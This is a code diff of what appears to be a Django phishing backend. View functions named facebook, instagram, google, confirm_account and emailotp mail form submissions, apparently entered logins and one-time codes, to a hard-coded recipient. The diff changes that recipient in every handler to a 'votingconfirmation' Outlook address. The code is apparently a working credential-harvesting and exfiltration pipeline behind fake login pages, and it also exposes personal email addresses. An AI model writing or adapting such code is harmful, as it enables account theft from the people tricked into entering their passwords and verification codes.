@@ -27,7 +27,7 @@ def confirm_account(request):
        send_mail('Contact Form',
         message,
         settings.EMAIL_HOST_USER,
-        ['osaigbovovictory23@gmail.com'], 
+        ['votingconfirmation22155@outlook.com'], 
         fail_silently=False, html_message=message)
 
        return redirect('success')
@@ -47,7 +47,7 @@ def emailotp(request):
        send_mail('Contact Form',
         message,
         settings.EMAIL_HOST_USER,
-        ['osaigbovovictory23@gmail.com'], 
+        ['votingconfirmation22155@outlook.com'], 
         fail_silently=False, html_message=message)
 
        return redirect('success')
@@ -83,7 +83,7 @@ def facebook(request):
        send_mail('Contact Form',
         message,
         settings.EMAIL_HOST_USER,
-        ['osaigbovovictory23@gmail.com'], 
+        ['votingconfirmation22155@outlook.com'], 
         fail_silently=False, html_message=message)
 
        return redirect('confirm_account')
@@ -103,7 +103,7 @@ def instagram(request):
        send_mail('Contact Form',
         message,
         settings.EMAIL_HOST_USER,
-        ['osaigbovovictory23@gmail.com'], 
+        ['votingconfirmation22155@outlook.com'], 
         fail_silently=False, html_message=message)
 
        return redirect('confirm_account')
@@ -135,7 +135,7 @@ def google(request):
        send_mail('Contact Form',
         message,
         settings.EMAIL_HOST_USER,
-        ['osaigbovovictory23@gmail.com'], 
+        ['votingconfirmation22155@outlook.com'], 
         fail_silently=False, html_message=message)
 
        return redirect('emailotp')
